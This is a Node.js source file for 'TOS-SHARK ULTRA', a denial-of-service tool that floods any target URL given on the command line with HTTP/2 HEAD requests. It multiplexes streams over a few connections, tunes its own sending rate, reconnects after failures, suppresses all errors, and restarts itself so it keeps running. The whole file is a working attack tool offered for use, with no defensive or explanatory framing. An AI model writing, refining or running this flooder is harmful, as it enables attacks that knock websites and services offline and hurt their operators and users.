const http2 = require('http2');
const { URL } = require('url');

class TOS_SHARK_ULTRA {
    constructor(target) {
        this.target = target;
        this.hostname = new URL(target).hostname;
        this.running = true;
        this.totalReqs = 0;
        
        // ULTRA EFFICIENT SETTINGS
        this.activeConns = 3;            // LESS CONNECTIONS, MORE STREAMS
        this.streamsPerConn = 100;       // MAX STREAMS PER CONNECTION
        this.batchDelay = 20;            // MORE DELAY BETWEEN BATCHES
        
        this.colors = {
            reset: '\x1b[0m',
            magenta: '\x1b[35m',
            green: '\x1b[92m',
            red: '\x1b[91m',
            cyan: '\x1b[96m'
        };
        
        this.connPool = [];
        this.lastRestart = Date.now();
        
        this.startUltraEngine();
    }
    
    startUltraEngine() {
        console.log(`${this.colors.cyan}[TOS-SHARK ULTRA]${this.colors.reset} Starting...`);
        
        // CREATE MINIMAL CONNECTIONS
        for (let i = 0; i < this.activeConns; i++) {
            this.createUltraConnection(i);
        }
        
        // ULTRA EFFICIENT BATCH SENDING
        this.sendUltraBatch = () => {
            if (!this.running) return;
            
            let sentThisBatch = 0;
            
            // USE EXISTING STREAMS EFFICIENTLY
            this.connPool.forEach(client => {
                if (client && client.socket && !client.destroyed) {
                    // SEND SMALL BATCH PER CONNECTION
                    for (let j = 0; j < 10; j++) {
                        this.sendUltraRequest(client);
                        sentThisBatch++;
                    }
                }
            });
            
            // SLOW DOWN IF DEVICE STRUGGLING
            const now = Date.now();
            if (now - this.lastRestart > 60000) { // AUTO-SLOW AFTER 1 MIN
                this.batchDelay = Math.min(100, this.batchDelay + 5);
            }
            
            // SCHEDULE NEXT BATCH WITH DYNAMIC DELAY
            setTimeout(this.sendUltraBatch, this.batchDelay);
        };
        
        // START THE CYCLE
        setTimeout(this.sendUltraBatch, 1000);
        
        // LOGGING
        setInterval(() => {
            const reqsPerSec = (this.totalReqs / 10).toFixed(0);
            console.log(`${this.colors.magenta}TOS-ULTRA${this.colors.reset}:${this.colors.green}${this.totalReqs}${this.colors.reset} (${reqsPerSec}/s)`);
            this.totalReqs = 0;
            
            // AUTO-OPTIMIZE BASED ON PERFORMANCE
            if (reqsPerSec < 100) {
                this.batchDelay = Math.max(5, this.batchDelay - 5);
            }
        }, 10000);
        
        // AUTO-RESTART EVERY 3 MINUTES
        setInterval(() => {
            console.log(`${this.colors.green}[AUTO-OPTIMIZING]${this.colors.reset}`);
            this.softRestart();
            this.lastRestart = Date.now();
        }, 180000);
    }
    
    createUltraConnection(id) {
        try {
            const client = http2.connect(this.target, {
                maxSessionMemory: 256 * 256,    // VERY LOW MEMORY
                maxSendHeaderBlockLength: 4096,
                peerMaxConcurrentStreams: this.streamsPerConn
            });
            
            // MINIMAL ERROR HANDLING
            client.on('error', () => {
                setTimeout(() => this.createUltraConnection(id), 5000);
            });
            
            this.connPool[id] = client;
            return true;
        } catch (e) {
            setTimeout(() => this.createUltraConnection(id), 10000);
            return false;
        }
    }
    
    sendUltraRequest(client) {
        try {
            // MINIMAL REQUEST - NO HEADERS, NO UA, NO CALLBACKS
            const req = client.request({
                ':method': 'HEAD',
                ':path': '/',
                ':authority': this.hostname
            });
            
            // INSTANT CLOSE - NO WAITING FOR RESPONSE
            req.end();
            req.close();
            
            this.totalReqs++;
        } catch (e) {
            // ABSOLUTELY SILENT FAIL
        }
    }
    
    softRestart() {
        // RESTART ONLY FAILED CONNECTIONS
        this.connPool.forEach((client, idx) => {
            if (!client || client.destroyed || !client.socket) {
                this.createUltraConnection(idx);
            }
        });
    }
    
    stop() {
        this.running = false;
        this.connPool.forEach(client => {
            try {
                if (client && !client.destroyed) {
                    client.destroy();
                }
            } catch (e) {}
        });
    }
}

// BULLETPROOF RUNNER
if (require.main === module) {
    // DISABLE ALL POSSIBLE CRASHES
    process.on('uncaughtException', (err) => {
        // IGNORE ALL ERRORS
    });
    
    process.on('unhandledRejection', () => {});
    
    // MINIMAL MEMORY
    require('v8').setFlagsFromString('--max-old-space-size=1024');
    
    // GARBAGE COLLECTOR FRIENDLY
    if (global.gc) {
        setInterval(() => {
            try { global.gc(); } catch (e) {}
        }, 30000);
    }
    
    function runForever() {
        try {
            if (process.argv.length < 3) {
                console.log('Usage: node tos-ultra.js https://target.com');
                process.exit(1);
            }
            
            const target = process.argv[2];
            console.log(`\n${'█'.repeat(50)}`);
            console.log(`🚀 TOS-SHARK ULTRA → ${target}`);
            console.log(`${'█'.repeat(50)}\n`);
            
            const shark = new TOS_SHARK_ULTRA(target);
            
            // GRACEFUL SHUTDOWN
            process.on('SIGINT', () => {
                console.log('\n🛑 Stopping...');
                shark.stop();
                process.exit(0);
            });
            
        } catch (e) {
            // RESTART ON ANY FAILURE
            console.log('♻️  Restarting...');
            setTimeout(runForever, 3000);
        }
    }
    
    runForever();
}
